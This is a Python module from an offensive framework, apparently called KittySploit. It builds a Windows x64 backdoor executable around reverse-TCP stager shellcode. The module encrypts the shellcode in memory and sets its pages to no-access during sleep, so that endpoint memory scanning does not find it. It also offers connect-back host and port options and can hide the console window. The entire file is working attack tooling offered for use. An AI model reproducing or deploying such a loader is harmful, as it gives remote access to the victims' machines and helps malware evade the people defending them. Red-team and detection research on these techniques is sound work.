#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Sleep memory obfuscation evasion loader (Ekko/Foliage-style).

Encrypts the shellcode region in memory, sets pages to NOACCESS during a
waitable-timer sleep, restores RX, then executes.
"""

import secrets

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_c_backdoor, option_value
from lib.compile.sleep_obfuscation import SleepObfuscationBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Sleep Obfuscation Evasion",
        "description": (
            "Generate a Windows x64 EXE that obfuscates shellcode in memory during "
            "Sleep (XOR/RC4 + PAGE_NOACCESS, Ekko/Foliage-style) before execution."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://attack.mitre.org/techniques/T1497/003/",
            "https://github.com/Cracked5pider/Ekko",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    cipher = OptChoice("chacha", "Embedded payload encryption", True, ["chacha", "rc4"])
    sleep = OptInteger(
        15000,
        "Obfuscated sleep duration in milliseconds (minimum 1000)",
        False,
    )
    output_name = OptString("sleep_obfuscation.exe", "Output executable filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the EXE", False, advanced=True)
    windows_subsystem = OptChoice(
        "windows",
        "PE subsystem (windows hides console)",
        False,
        ["windows", "console"],
    )

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        sleep_ms = max(1000, int(option_value(self, "sleep") or 15000))
        builder = SleepObfuscationBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=sleep_ms,
            obfuscation_key=secrets.token_bytes(1),
        )
        ok = build_encrypted_c_backdoor(
            self,
            builder,
            output_name="sleep_obfuscation.exe",
            save_source_name="sleep_obfuscation.c",
        )
        if ok:
            print_info(
                f"Obfuscated sleep: {sleep_ms} ms | "
                f"Payload cipher: {option_value(self, 'cipher')}"
            )
        return ok
